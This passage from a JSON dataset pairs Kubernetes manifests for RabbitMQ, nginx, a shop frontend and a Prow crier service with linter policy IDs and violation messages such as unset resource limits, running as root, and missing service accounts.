RABBITMQ_ULIMIT_NOFILES\n          value: '65536'\n        - name: RABBITMQ_USE_LONGNAME\n          value: 'true'\n        - name: RABBITMQ_ERL_COOKIE\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq\n              key: rabbitmq-erlang-cookie\n        - name: RABBITMQ_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq\n              key: rabbitmq-password\n      securityContext:\n        fsGroup: 1001\n        runAsUser: 1001\n      volumes:\n      - name: config-volume\n        configMap:\n          name: rabbitmq-config\n          items:\n          - key: rabbitmq.conf\n            path: rabbitmq.conf\n          - key: enabled_plugins\n            path: enabled_plugins\n      - name: healthchecks\n        configMap:\n          name: rabbitmq-healthchecks\n          items:\n          - key: rabbitmq-health-check\n            path: rabbitmq-health-check\n            mode: 111\n          - key: rabbitmq-api-check\n            path: rabbitmq-api-check\n            mode: 111\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"rabbitmq\" not found"
  },
  {
    "id": "11064",
    "manifest_path": "data/manifests/the_stack_sample/sample_4249.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: rabbitmq\n  labels:\n    app: rabbitmq\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rabbitmq\n  template:\n    metadata:\n      labels:\n        app: rabbitmq\n    spec:\n      serviceAccountName: rabbitmq\n      containers:\n      - name: rabbitmq\n        image: docker.io/bitnami/rabbitmq:3.8.3-debian-10-r79\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -ec\n        - 'mkdir -p /opt/bitnami/rabbitmq/.rabbitmq/\n\n          mkdir -p /opt/bitnami/rabbitmq/etc/rabbitmq/\n\n          touch /opt/bitnami/rabbitmq/var/lib/rabbitmq/.start\n\n          #persist the erlang cookie in both places for server and cli tools\n\n          echo $RABBITMQ_ERL_COOKIE > /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie\n\n          cp /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie /opt/bitnami/rabbitmq/.rabbitmq/\n\n          #change permission so only the user has access to the cookie file\n\n          chmod 600 /opt/bitnami/rabbitmq/.rabbitmq/.erlang.cookie /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie\n\n          #copy the mounted configuration to both places\n\n          cp  /opt/bitnami/rabbitmq/conf/* /opt/bitnami/rabbitmq/etc/rabbitmq\n\n          # Apply resources limits\n\n          ulimit -n \"${RABBITMQ_ULIMIT_NOFILES}\"\n\n          #replace the default password that is generated\n\n          sed -i \"/CHANGEME/cdefault_pass=${RABBITMQ_PASSWORD//\\\\/\\\\\\\\}\" /opt/bitnami/rabbitmq/etc/rabbitmq/rabbitmq.conf\n\n          exec rabbitmq-server\n\n          '\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/bitnami/rabbitmq/conf\n        - name: healthchecks\n          mountPath: /usr/local/sbin/rabbitmq-api-check\n          subPath: rabbitmq-api-check\n        - name: healthchecks\n          mountPath: /usr/local/sbin/rabbitmq-health-check\n          subPath: rabbitmq-health-check\n        - name: data\n          mountPath: /opt/bitnami/rabbitmq/var/lib/rabbitmq\n        ports:\n        - name: epmd\n          containerPort: 4369\n        - name: amqp\n          containerPort: 5672\n        - name: dist\n          containerPort: 25672\n        - name: stats\n          containerPort: 15672\n        livenessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - rabbitmq-api-check \"http://user:$RABBITMQ_PASSWORD@127.0.0.1:15672/api/healthchecks/node\"\n              '{\"status\":\"ok\"}'\n          initialDelaySeconds: 120\n          timeoutSeconds: 20\n          periodSeconds: 30\n          failureThreshold: 6\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - rabbitmq-health-check \"http://user:$RABBITMQ_PASSWORD@127.0.0.1:15672/api/healthchecks/node\"\n              '{\"status\":\"ok\"}'\n          initialDelaySeconds: 10\n          timeoutSeconds: 20\n          periodSeconds: 30\n          failureThreshold: 3\n          successThreshold: 1\n        env:\n        - name: BITNAMI_DEBUG\n          value: 'false'\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: K8S_SERVICE_NAME\n          value: rabbitmq-headless\n        - name: K8S_ADDRESS_TYPE\n          value: hostname\n        - name: RABBITMQ_NODENAME\n          value: rabbit@$(MY_POD_NAME).$(K8S_SERVICE_NAME).$(MY_POD_NAMESPACE).svc.cluster.local\n        - name: K8S_HOSTNAME_SUFFIX\n          value: .$(K8S_SERVICE_NAME).$(MY_POD_NAMESPACE).svc.cluster.local\n        - name: RABBITMQ_LOGS\n          value: '-'\n        - name: RABBITMQ_ULIMIT_NOFILES\n          value: '65536'\n        - name: RABBITMQ_USE_LONGNAME\n          value: 'true'\n        - name: RABBITMQ_ERL_COOKIE\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq\n              key: rabbitmq-erlang-cookie\n        - name: RABBITMQ_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq\n              key: rabbitmq-password\n      securityContext:\n        fsGroup: 1001\n        runAsUser: 1001\n      volumes:\n      - name: config-volume\n        configMap:\n          name: rabbitmq-config\n          items:\n          - key: rabbitmq.conf\n            path: rabbitmq.conf\n          - key: enabled_plugins\n            path: enabled_plugins\n      - name: healthchecks\n        configMap:\n          name: rabbitmq-healthchecks\n          items:\n          - key: rabbitmq-health-check\n            path: rabbitmq-health-check\n            mode: 111\n          - key: rabbitmq-api-check\n            path: rabbitmq-api-check\n            mode: 111\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rabbitmq\" has cpu request 0"
  },
  {
    "id": "11065",
    "manifest_path": "data/manifests/the_stack_sample/sample_4249.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: rabbitmq\n  labels:\n    app: rabbitmq\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: rabbitmq\n  template:\n    metadata:\n      labels:\n        app: rabbitmq\n    spec:\n      serviceAccountName: rabbitmq\n      containers:\n      - name: rabbitmq\n        image: docker.io/bitnami/rabbitmq:3.8.3-debian-10-r79\n        imagePullPolicy: IfNotPresent\n        command:\n        - bash\n        - -ec\n        - 'mkdir -p /opt/bitnami/rabbitmq/.rabbitmq/\n\n          mkdir -p /opt/bitnami/rabbitmq/etc/rabbitmq/\n\n          touch /opt/bitnami/rabbitmq/var/lib/rabbitmq/.start\n\n          #persist the erlang cookie in both places for server and cli tools\n\n          echo $RABBITMQ_ERL_COOKIE > /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie\n\n          cp /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie /opt/bitnami/rabbitmq/.rabbitmq/\n\n          #change permission so only the user has access to the cookie file\n\n          chmod 600 /opt/bitnami/rabbitmq/.rabbitmq/.erlang.cookie /opt/bitnami/rabbitmq/var/lib/rabbitmq/.erlang.cookie\n\n          #copy the mounted configuration to both places\n\n          cp  /opt/bitnami/rabbitmq/conf/* /opt/bitnami/rabbitmq/etc/rabbitmq\n\n          # Apply resources limits\n\n          ulimit -n \"${RABBITMQ_ULIMIT_NOFILES}\"\n\n          #replace the default password that is generated\n\n          sed -i \"/CHANGEME/cdefault_pass=${RABBITMQ_PASSWORD//\\\\/\\\\\\\\}\" /opt/bitnami/rabbitmq/etc/rabbitmq/rabbitmq.conf\n\n          exec rabbitmq-server\n\n          '\n        volumeMounts:\n        - name: config-volume\n          mountPath: /opt/bitnami/rabbitmq/conf\n        - name: healthchecks\n          mountPath: /usr/local/sbin/rabbitmq-api-check\n          subPath: rabbitmq-api-check\n        - name: healthchecks\n          mountPath: /usr/local/sbin/rabbitmq-health-check\n          subPath: rabbitmq-health-check\n        - name: data\n          mountPath: /opt/bitnami/rabbitmq/var/lib/rabbitmq\n        ports:\n        - name: epmd\n          containerPort: 4369\n        - name: amqp\n          containerPort: 5672\n        - name: dist\n          containerPort: 25672\n        - name: stats\n          containerPort: 15672\n        livenessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - rabbitmq-api-check \"http://user:$RABBITMQ_PASSWORD@127.0.0.1:15672/api/healthchecks/node\"\n              '{\"status\":\"ok\"}'\n          initialDelaySeconds: 120\n          timeoutSeconds: 20\n          periodSeconds: 30\n          failureThreshold: 6\n          successThreshold: 1\n        readinessProbe:\n          exec:\n            command:\n            - sh\n            - -c\n            - rabbitmq-health-check \"http://user:$RABBITMQ_PASSWORD@127.0.0.1:15672/api/healthchecks/node\"\n              '{\"status\":\"ok\"}'\n          initialDelaySeconds: 10\n          timeoutSeconds: 20\n          periodSeconds: 30\n          failureThreshold: 3\n          successThreshold: 1\n        env:\n        - name: BITNAMI_DEBUG\n          value: 'false'\n        - name: MY_POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: K8S_SERVICE_NAME\n          value: rabbitmq-headless\n        - name: K8S_ADDRESS_TYPE\n          value: hostname\n        - name: RABBITMQ_NODENAME\n          value: rabbit@$(MY_POD_NAME).$(K8S_SERVICE_NAME).$(MY_POD_NAMESPACE).svc.cluster.local\n        - name: K8S_HOSTNAME_SUFFIX\n          value: .$(K8S_SERVICE_NAME).$(MY_POD_NAMESPACE).svc.cluster.local\n        - name: RABBITMQ_LOGS\n          value: '-'\n        - name: RABBITMQ_ULIMIT_NOFILES\n          value: '65536'\n        - name: RABBITMQ_USE_LONGNAME\n          value: 'true'\n        - name: RABBITMQ_ERL_COOKIE\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq\n              key: rabbitmq-erlang-cookie\n        - name: RABBITMQ_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: rabbitmq\n              key: rabbitmq-password\n      securityContext:\n        fsGroup: 1001\n        runAsUser: 1001\n      volumes:\n      - name: config-volume\n        configMap:\n          name: rabbitmq-config\n          items:\n          - key: rabbitmq.conf\n            path: rabbitmq.conf\n          - key: enabled_plugins\n            path: enabled_plugins\n      - name: healthchecks\n        configMap:\n          name: rabbitmq-healthchecks\n          items:\n          - key: rabbitmq-health-check\n            path: rabbitmq-health-check\n            mode: 111\n          - key: rabbitmq-api-check\n            path: rabbitmq-api-check\n            mode: 111\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rabbitmq\" has memory limit 0"
  },
  {
    "id": "11066",
    "manifest_path": "data/manifests/the_stack_sample/sample_4251.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: nginx\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    name: nginx\n    resources: {}\n    livenessProbe:\n      exec:\n        command:\n        - ls\n      periodSeconds: 5\n      initialDelaySeconds: 5\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11067",
    "manifest_path": "data/manifests/the_stack_sample/sample_4251.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: nginx\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    name: nginx\n    resources: {}\n    livenessProbe:\n      exec:\n        command:\n        - ls\n      periodSeconds: 5\n      initialDelaySeconds: 5\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11068",
    "manifest_path": "data/manifests/the_stack_sample/sample_4251.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: nginx\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    name: nginx\n    resources: {}\n    livenessProbe:\n      exec:\n        command:\n        - ls\n      periodSeconds: 5\n      initialDelaySeconds: 5\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11069",
    "manifest_path": "data/manifests/the_stack_sample/sample_4251.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: nginx\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    name: nginx\n    resources: {}\n    livenessProbe:\n      exec:\n        command:\n        - ls\n      periodSeconds: 5\n      initialDelaySeconds: 5\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11070",
    "manifest_path": "data/manifests/the_stack_sample/sample_4251.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    run: nginx\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    name: nginx\n    resources: {}\n    livenessProbe:\n      exec:\n        command:\n        - ls\n      periodSeconds: 5\n      initialDelaySeconds: 5\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11071",
    "manifest_path": "data/manifests/the_stack_sample/sample_4252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: kirilldemtchenko/frontend-otus:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11072",
    "manifest_path": "data/manifests/the_stack_sample/sample_4252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: kirilldemtchenko/frontend-otus:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "11073",
    "manifest_path": "data/manifests/the_stack_sample/sample_4252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: kirilldemtchenko/frontend-otus:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"server\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "11074",
    "manifest_path": "data/manifests/the_stack_sample/sample_4252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: kirilldemtchenko/frontend-otus:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "11075",
    "manifest_path": "data/manifests/the_stack_sample/sample_4252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: kirilldemtchenko/frontend-otus:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "11076",
    "manifest_path": "data/manifests/the_stack_sample/sample_4252.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: kirilldemtchenko/frontend-otus:v0.0.1\n        readinessProbe:\n          initialDelaySeconds: 10\n          httpGet:\n            path: /_healthz\n            port: 8080\n            httpHeaders:\n            - name: Cookie\n              value: shop_session-id=x-readiness-probe\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "11077",
    "manifest_path": "data/manifests/the_stack_sample/sample_4253.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nginx-daemonset-example\nspec:\n  selector:\n    matchLabels:\n      app: nginx-daemon\n      environment: test\n  template:\n    metadata:\n      labels:\n        app: nginx-daemon\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        command:\n        - /bin/sh\n        - -c\n        - 'echo \"You have been served by Pod running on Node with IP address: $(NODE_IP)\"\n          > /usr/share/nginx/html/index.html\n\n          nginx -g \"daemon off;\"'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11078",
    "manifest_path": "data/manifests/the_stack_sample/sample_4253.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nginx-daemonset-example\nspec:\n  selector:\n    matchLabels:\n      app: nginx-daemon\n      environment: test\n  template:\n    metadata:\n      labels:\n        app: nginx-daemon\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        command:\n        - /bin/sh\n        - -c\n        - 'echo \"You have been served by Pod running on Node with IP address: $(NODE_IP)\"\n          > /usr/share/nginx/html/index.html\n\n          nginx -g \"daemon off;\"'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11079",
    "manifest_path": "data/manifests/the_stack_sample/sample_4253.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nginx-daemonset-example\nspec:\n  selector:\n    matchLabels:\n      app: nginx-daemon\n      environment: test\n  template:\n    metadata:\n      labels:\n        app: nginx-daemon\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        command:\n        - /bin/sh\n        - -c\n        - 'echo \"You have been served by Pod running on Node with IP address: $(NODE_IP)\"\n          > /usr/share/nginx/html/index.html\n\n          nginx -g \"daemon off;\"'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11080",
    "manifest_path": "data/manifests/the_stack_sample/sample_4253.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: nginx-daemonset-example\nspec:\n  selector:\n    matchLabels:\n      app: nginx-daemon\n      environment: test\n  template:\n    metadata:\n      labels:\n        app: nginx-daemon\n        environment: test\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17\n        ports:\n        - containerPort: 80\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        command:\n        - /bin/sh\n        - -c\n        - 'echo \"You have been served by Pod running on Node with IP address: $(NODE_IP)\"\n          > /usr/share/nginx/html/index.html\n\n          nginx -g \"daemon off;\"'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11081",
    "manifest_path": "data/manifests/the_stack_sample/sample_4257.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20220111-cd3e975bc1\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "11082",
    "manifest_path": "data/manifests/the_stack_sample/sample_4257.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20220111-cd3e975bc1\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: kubeconfig-build-test-infra-trusted\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig-build-test-infra-trusted\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"crier\" not found"
  },
  {
    "id": "11083",
    "manifest_path": "data/manifests/the_stack_sample/sample_4257.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20220111-cd3e975bc1\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubernetes-blob-storage-workers=1\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config:/etc/kubeconfig-build-test-infra-trusted/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/kubeconfig-build-test-infra-trusted\n          name: kubeconfig-build-test-infra-trusted\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: 